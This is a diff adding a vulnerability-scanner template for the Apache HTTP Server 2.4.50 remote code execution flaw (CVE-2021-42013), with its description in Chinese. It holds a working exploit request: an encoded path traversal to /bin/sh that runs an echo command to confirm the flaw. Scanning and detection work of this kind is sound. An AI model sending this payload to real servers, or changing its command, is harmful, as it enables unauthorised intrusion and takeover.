@@ -1,0 +1,20 @@
+name: "Apache HTTP Server 2.4.50 RCE (CVE-2021-42013)"
+description: "利用 Apache HTTP Server 2.4.50 的路径规范化缺陷，攻击者通过构造恶意请求绕过访问限制，在受影响服务器上执行任意系统命令，可导致服务器完全被控制、敏感数据泄露或服务不可用。"
+severity: "critical"
+references:
+  - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013"
+
+requests:
+  - steps:
+      - method: "POST"
+        path: "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
+        headers:
+          User-Agent: "Mozilla/5.0"
+          Content-Type: "application/x-www-form-urlencoded"
+        body: "echo; echo 'VULN_TEST'"
+        matchers:
+          - type: "word"
+            words: ["VULN_TEST"]
+            condition: "and"
+          - type: "status"
+            status: [200]
